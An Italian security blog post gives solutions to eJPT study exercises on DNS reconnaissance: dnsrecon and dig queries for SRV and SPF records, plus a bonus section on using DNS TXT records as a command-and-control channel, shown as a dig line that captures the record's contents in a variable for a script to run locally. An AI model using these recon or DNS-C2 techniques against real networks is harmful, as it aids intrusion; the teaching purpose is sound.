---
title: Esercizi su DNS recon
url: https://roccosicilia.com/2025/06/23/esercizi-su-dns-recon/
source: Over Security - Cybersecurity news aggregator
date: 2025-06-24
fetch_date: 2025-10-06T22:54:31.630674
---

# Esercizi su DNS recon

# [Rocco Sicilia](https://roccosicilia.com)

Search

* [Home](https://roccosicilia.com)
* [About me](https://roccosicilia.com/about/)
* [Divulgazione](https://roccosicilia.com/progetto-di-divulgazione/)
* [Sostieni il progetto](https://roccosicilia.com/sostieni-il-progetto/)
* [English version](https://medium.com/%40roccosicilia)

[cyber security](https://roccosicilia.com/category/cyber-security/), [hacking](https://roccosicilia.com/category/hacking/), [ita](https://roccosicilia.com/category/ita/), [study with me](https://roccosicilia.com/category/study-with-me/)

## [Esercizi su DNS recon](https://roccosicilia.com/2025/06/23/esercizi-su-dns-recon/)

Published by

Rocco Sicilia

on

[23 giugno 2025](https://roccosicilia.com/2025/06/23/esercizi-su-dns-recon/)

[![Esercizi su DNS recon](https://roccosicilia.com/wp-content/uploads/2025/06/ejpt_copertina.png?w=1024)](https://roccosicilia.com/2025/06/23/esercizi-su-dns-recon/)

Sul canale Patreon, come annunciato qualche settimana fa, sto pubblicando una serie di video con i [miei appunti relativi ai temi della eJPT](https://www.patreon.com/collection/1375290?view=expanded). Per ogni video condivido degli esercizi pratici con l’obiettivo di far pratica con i concetti che racconto e di cui scrivo nei post di approfondimento. Sul tema della DNS recon ho già scritto in passato, qui riporto la “soluzione” agli esercizi proposti nel video.

#### Esercizio 1: record SRV

I record SRV vengono utilizzati per identificare specifici servizi tramite precise informazioni inserire nel record. Il tool *dnsrecon* può essere utile a tale scopo.

```
$ dnsrecon -d microsoft.com
```

La richiesta consente di individuare diversi record DNS tra cui quelli relativi ai servizi.

![](https://roccosicilia.com/wp-content/uploads/2025/06/image-12.png?w=826)

dnsrecon output

Rispetto ai record “A” si ha qualche informazione in più in merito all’host definito nel record, ammesso che si tratti di hosts ancora in uso.

#### Esercizio 2: intere subnet dichiarate come SPF

Come discusso nel video della sessione, in alcuni casi chi si occupa della configurazione della zona DNS e dei relativi record non sempre mantiene le configurazioni “pulite”. Le attività di DNS recon puntano ad individuare nuovi host della rete target: trovare quindi configurazioni DNS che dichiarano intere subnet è, dal punto di vista dell’attacker, un vantaggio non trascurabile.

```
dig TXT nomedominio.xyz | grep -i spf1
```

#### Esercizio 3: DNS multi uso

Domanda bonus: come può essere utilizzato il servizio DNS in un contesto C2? Ci sono diverse tecniche che consentono di utilizzare le query DNS come mezzo di comunicazione tra un host compromesso ed il C2 server.

Un trucco abbastanza semplice è utilizzare i record TXT per posizionare online dei contenuti, ad esempio dei comandi powershell o bash all’interno del record. Per eseguire i comandi localmente l’utente devo solo “scaricare” il contenuto del record in una variabile e poi passarlo come comando locale.

```
$ dig TXT bithorn.org|grep -i test
bithorn.org.   422  IN  TXT	"TEST_CONTENT_LABZ"
```

Il comando *dig* interroga il DNS, in questo esempio ho volutamente cerato un record TXT che contenesse la stringa “test”. Con lo stesso principio possiamo cercare un record specifico al cui interno abbiamo posizionalo la stringa di un comando e salvarla in una variabile.

```
TEST=$(dig TXT bithorn.org|grep -i test|awk '{print $5}')
```

Una volta “raccolto” il comando tramite la query possiamo chiedere allo script di eseguirlo localmente.
In un prossimo post di approfondimento dedico un po’ di spazio al tema e parliamo anche di come inviare gli output sempre via DNS.

---

Il video completo è disponibile sul mio canale Patreon:

[![](https://roccosicilia.com/wp-content/uploads/2025/06/image-13.png?w=727)](https://www.patreon.com/posts/ejpt-02-passive-130528250)

video completo su DNS recon.

---

#### Prossimo video

In programma per la prossima sessione ho messo la parte di Web Application Firewall e le tecniche di subdomain enumeration, in parte anticipate in questa sessione.

### Condividi:

* Fai clic per inviare un link a un amico via e-mail (Si apre in una nuova finestra)
  E-mail
* [Fai clic qui per condividere su LinkedIn (Si apre in una nuova finestra)
  LinkedIn](https://roccosicilia.com/2025/06/23/esercizi-su-dns-recon/?share=linkedin)
* [Fai clic per condividere su Telegram (Si apre in una nuova finestra)
  Telegram](https://roccosicilia.com/2025/06/23/esercizi-su-dns-recon/?share=telegram)
* [Fai clic per condividere su WhatsApp (Si apre in una nuova finestra)
  WhatsApp](https://roccosicilia.com/2025/06/23/esercizi-su-dns-recon/?share=jetpack-whatsapp)

Mi piace Caricamento…

### Lascia un commento [Cancella risposta](/2025/06/23/esercizi-su-dns-recon/#respond)

Δ

Questo sito utilizza Akismet per ridurre lo spam. [Scopri come vengono elaborati i dati derivati dai commenti](https://akismet.com/privacy/).

←[Precedente: MISP: note tecniche (1)](https://roccosicilia.com/2025/06/19/misp-note-tecniche-1/)

[Successivo: Da quale recovery point parto?](https://roccosicilia.com/2025/06/27/da-quale-recovery-point-parto/)→

Ciao,

### sono Rocco

![](https://sheliakblog.wordpress.com/wp-content/uploads/2025/04/photo.jpeg?w=389)

… e questo è mio sito personale dove condivido idee, riflessioni ed esperienze su hacking e sicurezza informatica.

### Let’s connect

* [Patreon](https://patreon.com/roccosicilia)

* [YouTube](https://youtube.com/%40roccosicilia)

* [LinkedIn](https://www.linkedin.com/in/roccosicilia/)

### Rimani aggiornato!

Iscriviti per ricevere gli update dei nuovi post e video.

Digita la tua e-mail…

→

### Recent posts

* [![Info Sec Unplugged [1b] – DR e Cyber recovery (parte 2)](https://roccosicilia.com/wp-content/uploads/2025/01/vlog.png?w=600)](https://roccosicilia.com/2025/10/04/info-sec-unplugged-1b-dr-e-cyber-recovery-parte-2/)

  ## [Info Sec Unplugged [1b] – DR e Cyber recovery (parte 2)](https://roccosicilia.com/2025/10/04/info-sec-unplugged-1b-dr-e-cyber-recovery-parte-2/)
* [![Info Sec Unplugged [1a] – DR e Cyber recovery (parte 1)](https://roccosicilia.com/wp-content/uploads/2024/12/podcast.png?w=541)](https://roccosicilia.com/2025/09/22/info-sec-unplugged-1a-dr-e-cyber-recovery-parte-1/)

  ## [Info Sec Unplugged [1a] – DR e Cyber recovery (parte 1)](https://roccosicilia.com/2025/09/22/info-sec-unplugged-1a-dr-e-cyber-recovery-parte-1/)
* [![Live del 05.09.2025: http_c2](https://roccosicilia.com/wp-content/uploads/2025/08/youtube-live.png?w=1024)](https://roccosicilia.com/2025/09/09/live-del-05-09-2025-http_c2/)

  ## [Live del 05.09.2025: http\_c2](https://roccosicilia.com/2025/09/09/live-del-05-09-2025-http_c2/)
* [![Info Sec Unplugged [19] – Threat Int. (3a parte)](https://roccosicilia.com/wp-content/uploads/2024/12/podcast.png?w=541)](https://roccosicilia.com/2025/09/08/info-sec-unplugged-18-threat-int-3a-parte/)

  ## [Info Sec Unplugged [19] – Threat Int. (3a parte)](https://roccosicilia.com/2025/09/08/info-sec-unplugged-18-threat-int-3a-parte/)
* [![Assume Breach: evoluzione di uno scenario](https://roccosicilia.com/wp-content/uploads/2025/01/coding.png?w=562)](https://roccosicilia.com/2025/09/05/assume-breach-evoluzione-di-uno-scenario/)

  ## [Assume Breach: evoluzione di uno scenario](https://roccosicilia.com/2025/09/05/assume-breach-evoluzione-di-uno-scenario/)
* [![100 video](https://roccosicilia.com/wp-content/uploads/2025/08/youtube-live.png?w=1024)](https://roccosicilia.com/2025/08/28/100-video/)

  ## [100 video](https://roccosicilia.com/2025/08/28/100-video/)

# [Rocco Sicilia](https://roccosicilia.com)

* Mail
* [Patreon](https://patreon.com/roccosicilia)
* [YouTube](https://youtube.com/%40roccosicilia)
* [LinkedIn](https://www.linkedin.com/in/roccosicilia/)
* [GitHub](https://github.com/roccosicilia)
* [Telegram](https://t.me/%2Ba7sF3JQV4bMzY2Nk)
* [Link](https://discord.gg/Ys5AAbsyyH)

* [Home](https://roccosicilia.com)
* [About me](https://roccosicilia.c...